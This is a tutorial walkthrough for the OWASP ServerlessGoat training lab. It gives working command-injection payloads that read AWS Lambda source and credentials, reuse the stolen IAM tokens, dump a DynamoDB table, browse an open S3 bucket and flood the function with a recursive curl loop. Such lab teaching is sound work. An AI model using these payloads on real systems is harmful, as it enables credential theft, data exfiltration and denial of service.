## ServerlessGoat: Lessons ##

*This tutorial assumes the reader has basic knowledge of serverless security concepts. It is recommended to first review the Serverless Security Top 10 Most Common Weaknesses Guide* [Guide](https://github.com/puresec/sas-top-10)

### Lesson 1: Information Gathering ###
We begin our journey into serverless security by gathering some reconnaissance on the application. At first sight, malicious users won't know that they are facing a serverless application. So, it is only natural to begin by collecting intelligence.

#### Option 1 #### 
If the application is exposed through AWS API Gateway, the URL might have the following format:
https://{string}.execute-api.{region}.amazonaws.com/{stage}/...

#### Option 2 ####
If the application is exposed through AWS API Gateway, HTTP Response headers might contain header names such as: `x-amz-apigw-id`, `x-amzn-requestid`, `x-amzn-trace-id`

#### Option 3 ####
If the developer left unhandled exceptions and verbose error messages, these messages might contain sensitive information, which points to the fact that this is an AWS Lambda serverless application. For example, try to invoke the API behind the convert form using an HTTP get request, but without the `document_url` parameter in the Query string: ```https://eqfh35ixqj.execute-api.us-east-1.amazonaws.com/Prod/api/convert```

This will generate the following stack trace:
```
TypeError: Cannot read property 'document_url' of null
at log (/var/task/index.js:9:49)
at exports.handler (/var/task/index.js:25:11)
```
Looking at the stack trace, we see that the application is located in the /var/task directory, which is where AWS Lambda stores and executes your Lambda function. We also see the string `exports.handler`, which is a very common way to name serverless functions (i.e. the function name is `handler`, and it is defined inside `index.js`).

#### Lesson Learned: Use API Gateway Request Validation ####
Developers should never assume anything about the correctness of API invocations and the data being sent as input. Proper request validation should always be done as a first security measure. AWS API Gateway can perform basic request validation through the 'Request Validation' feature, which includes the following checks:

* The required request parameters in the URI, query string, and headers of an incoming request are included and non-blank
* The applicable request payload adheres to the configured JSON schema request model of the method

To enable basic validation in AWS API Gateway, you specify validation rules in a request validator, add the validator to the API's map of request validators, and assign the validator to individual API methods.

More information on API Gateway Request Validation feature can be find [here](https://docs.aws.amazon.com/apigateway/latest/developerguide/api-gateway-method-request-validation.html).

These are just a few hints to get you started.

### Lesson 2: Reverse Engineering The Lambda Function ###
The next obvious step, is to try and gain access to the source code of the Lambda function in order to reverse engineer it and discover additional weaknesses. For this step, we will try to check whether the function is vulnerable to OS command injection.

We will blindly probe for OS command injection using a common time-based probing method - i.e. by invoking the sleep shell command.

* In the URL field of the form, enter the following value in the URL field: `https://www.puresec.io/hubfs/document.doc` - this legitimate URL will return the converted text of the document
* Now try the following value: `https://www.puresec.io/hubfs/document.doc; sleep 1 #` and hit 'submit'. The function will run, albeit will return some garbled text
* Next, we will try with a really long sleep value, which will force the AWS Lambda function to hit the timeout it is configured with (default is 5 minutes): `https://www.puresec.io/hubfs/document.doc; sleep 5000 #`

Output:
Error message: ```{"message": "Internal server error"}```

Now we know that the application is vulnerable to OS command injection through the `document_url` parameter of the API, and we can move on to extract its source code, by sending the following value in the URL field: `https://foobar; cat /var/task/index.js #`

This should return the source code of the function - below is a snippet of the file, which can be found in full [here](https://github.com/OWASP/Serverless-Goat/blob/master/src/api/convert/index.js)

```js
const child_process = require('child_process');
const AWS = require('aws-sdk');
const uuid = require('node-uuid');

async function log(event) {
  const docClient = new AWS.DynamoDB.DocumentClient();
  let requestid = event.requestContext.requestId;
  let ip = event.requestContext.identity.sourceIp;
  let documentUrl = event.queryStringParameters.document_url;

  await docClient.put({
      TableName: process.env.TABLE_NAME,
      Item: {
        'id': requestid,
        'ip': ip,
        'document_url': documentUrl
      }
    }
  ).promise();

}
```

There's a lot to be learned from the source code:
* The application uses the AWS DynamoDB NoSQL database
* The application uses a Node.js package called node-uuid
* The application stores sensitive user information (IP address and document URL) inside the DynamoDB table, who's name is defined in the `TABLE_NAME` environment variable
* We see the root cause behind the OS command injection - using untrusted user input in the `child_process.execSync()` call
* The output of API invocations is stored inside an S3 bucket, whose name is also stored inside an environment variable - `BUCKET_NAME`

### Lesson 3: Digging For Gold Inside Environment Variables ###
In a well secured AWS Lambda environment, users should not be able to gain access to environment variables, as these variables include sensitive information. **IMPORTANT:** It is bad practice to store sensitive information in an unencrypted manner inside environment variables.

Let's grab the data from the environment variables by running the `env` command - in the URL field of the form, type: `https://foobar; env #`

{Partial Values}
```
AWS_SESSION_TOKEN=XXXXXXXXXXXXX
TABLE_NAME={dynamo_table_name}
AWS_SECRET_ACCESS_KEY=XXXXXXXXXXXXX
BUCKET_NAME={bucket_name}
AWS_ACCESS_KEY_ID=XXXXXXXXXXXXX
```
First, by grabbing the 3 IAM tokens - `AWS_SESSION_TOKEN`, `AWS_SECRET_ACCESS_KEY` and `AWS_ACCESS_KEY_ID`, we can now assume the function's temporary execution role. For those of you who aren't familiar with the AWS IAM security model, this is an extremely granular and powerful security permissions model. Here's an excerpt from the AWS documentation on IAM roles:

```An IAM role is similar to a user, in that it is an AWS identity with permission policies that determine what the identity can and cannot do in AWS. However, instead of being uniquely associated with one person, a role is intended to be assumable by anyone who needs it. Also, a role does not have standard long-term credentials (password or access keys) associated with it. Instead, if a user assumes a role, temporary security credentials are created dynamically and provided to the user. You can use roles to delegate access to users, applications, or services that don't normally have access to your AWS resources.```

More information on AWS IAM and AWS Lambda can be found in the AWS [documentation](https://docs.aws.amazon.com/lambda/latest/dg/access-control-identity-based.html).

#### Assuming the Lambda Function's Role, In the Convenience of Your Own Terminal ####
Now, given that we have the tokens generated for the function by the AWS STS service, we can use the tokens to invoke AWS CLI commands from our local machine. In order to do that, get the values, and set these environment variables locally by running in a shell terminal:

```
export AWS_SECRET_ACCESS_KEY = "..."
export AWS_ACCESS_KEY_ID = "..."
export AWS_SESSION_TOKEN = "..."
```

Next, you can verify that you are indeed using the function's role, locally, by running: `aws sts get-caller-identity`.

This should return the following:
```
{
    "UserId": "xxxxxxxxx",
    "Account": "xxxxxxxxxx",
    "Arn": "arn:aws:sts::xxxxxxxxxxxx:assumed-role/aws-serverless-repository-serv-FunctionConvertRole-xxxxxxxx/aws-serverless-repository-serverle-FunctionConvert-xxxxxxxxxx"
}
```
It's clear that we are now running under the assumed role of the function. We will get back to using the AWS CLI later on.

### Lesson 4: Exploiting Over-Privileged IAM Roles ###
As can be seen in the code, the developer is inserting the client's IP address and the document URL value into the DynamoDB table, by using the `put()` method of `AWS.DynamoDB.DocumentClient`. In a secure system, the permissions granted to the function should be least-privileged and minimal, i.e. only `dynamodb:PutItem`. However, when the developer chose the CRUD DynamoDB policy provided by AWS SAM, he/she granted the function with the following permissions:
```
- dynamodb:GetItem
- dynamodb:DeleteItem
- dynamodb:PutItem
- dynamodb:Scan
- dynamodb:Query
- dynamodb:UpdateItem
- dynamodb:BatchWriteItem
- dynamodb:BatchGetItem
- dynamodb:DescribeTable
```
These permissions will now allow us to exploit the OS command injection weakness, to exfiltrate data from the DynamoDB table, by abusing the `dynamodb:Scan` permission:

Let's use the following payload in the URL field, and see what happens:
```
https://; node -e 'const AWS = require("aws-sdk"); (async () => {console.log(await new AWS.DynamoDB.DocumentClient().scan({TableName: process.env.TABLE_NAME}).promise());})();'
```
**Bingo!** we got the entire contents of the table:
```
{ Items: [ { document_url: 'https://mmm; env #', id: '9737d9bd-02d5-11e9-8e7b-4f1a91d122d7', ip: 'XX.XXX.XXX.XX' }, { document_url: 'http://mmm; env #', id: 'b7c18b3a-02ed-11e9-a3d5-175f28e986d4'
...
...
```

**Extra Credit** You can use the same approach, to access and tamper data inside the S3 bucket. Try it!


### Lesson 5: Abusing Insecure Cloud Configurations ###
By now, we're sure you are well aware of the many publicly open S3 buckets out there. This happens when you deploy cloud resources without following security best-practices. The same thing exists in our application. We already know the name of the bucket used by the application - we got it in the BUCKET_NAME environment variable, and frankly, it wasn't that difficult to spot it in the redirect URL of the response to the convert operation:

`http://aws-serverless-repository-serverless-goat-bucket-{string}.s3-website-{region}.amazonaws.com/{uuid}`

So, the bucket is called: `aws-serverless-repository-serverless-goat-bucket-{string}`

Let's try to request it. Just paste the bucket name in the following format, in your browser's URL line: `http://aws-serverless-repository-serverless-goat-bucket-{string}.s3.amazonaws.com/`

You should get a full listing of the entire bucket contents. For example:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/"><Name>aws-serverless-repository-serverless-goat-bucket-{string}</Name><Prefix></Prefix><Marker></Marker><MaxKeys>1000</MaxKeys><IsTruncated>false</IsTruncated><Contents><Key>0858ac61-cdcf-486e-93c4-c05d31e58f93</Key><LastModified>2018-12-18T12:03:22.000Z</LastModified>
<ETag>&quot;ce1ed7ade5ee78fabeba4e31d307b67f&quot;</ETag><Size>2605</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>12776bf6-c034-4590-a1df-5dc8a5d9a810</Key><LastModified>2018-12-18T14:43:11.000Z</LastModified><ETag>&quot;f5c029f6b1af90e22f57a5cebbe14e47&quot;</ETag><Size>1942</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>14b7a569-6619-4117-8a01-4430b975b676</Key>
...
...
```
You can now try to browse other files in the bucket, belonging to other user's 'convert' operations by concatenating the uuid to the URL (that's the file name).

### Lesson 6: Finding Known Vulnerabilities In Open Source Packages ###
When we retrieved the source code of the Lambda function, we saw that it includes a dependency to the `node-uuid` NPM package: `const uuid = require('node-uuid');`

However, we need to know the version of the uuid package. Lets run `ls -lF` on the AWS Lambda /var/task directory, and see what we can find - try the following value in the URL form field: `https://www.puresec.io/hubfs/document.doc; ls #`

The results should be:
```
bin
index.js
node_modules
package.json
package-lock.json
```
Oops, the developer made a mistake and packaged the package.json file together with the function. Let's list its contents - use the following value in the URL form field: `https://www.puresec.io/hubfs/document.doc; cat package.json #`

Results:
```json
{
    "private": true,
    "dependencies": {
        "node-uuid": "1.4.3"
    }
}
```
Version 1.4.3 of this package is very old. Now it's time to launch your favorite OSS dependency checker and see what you can dig. Anyway, from here on, you are 'off script', we didn't plan for you to actually exploit the vulnerable dependency at this point.

### Lesson 7: Denial of Service - Really?! On Serverless? ###
Yes... even though serverless platforms automatically scale for you, by invoking concurrent function executions, there are limits. You can read more about the limits in the official AWS [documentation](https://docs.aws.amazon.com/lambda/latest/dg/concurrent-executions.html). You might have noticed, that you have a concurrency limit for the entire AWS account (the default is 1,000), but if you want to make sure that a single function doesn't end up depleting your entire account's concurrency limit, you should be using 'reserved capacity'. The developer of ServerlessGoat was smart enough to set each function with its own reserved capacity of 5 concurrency execution. We are going to abuse that. There are many ways to invoke the function 5 times, but if you want all 5 executions to stay alive for enough time, calling them recursively might help - here's the trick:

`https://i92uw6vw73.execute-api.us-east-1.amazonaws.com/Prod/api/convert?document_url=https%3A%2F%2Fi92uw6vw73.execute-api.us-east-1.amazonaws.com%2FProd%2Fapi%2Fconvert%3Fdocument_url...`

Note: This is going to be easier with a script...
* Craft a URL, starting with the actual API URL
* Set the value of the `document_url` to invoke itself, but URL-encode the URL (it's a parameter value now)
* Copy the entire thing, URL-encode all of it, and paste it as the parameter value, to yet another regular API URL
* Rinse, repeat x5 times. You should end up with a long URL like the one above

Now, let's get AWS Lambda busy with this, by invoking this at least a 100 times. For example:
```shell
for i in {1..100}; do
 echo $i
 curl -L https://{paste_url_here}
done
```
Let it run, and in a different terminal window, run another loop, with a simple API call. If you're lucky, from time to time you will notice a server(less) error reply. Yup, other users are not getting service.
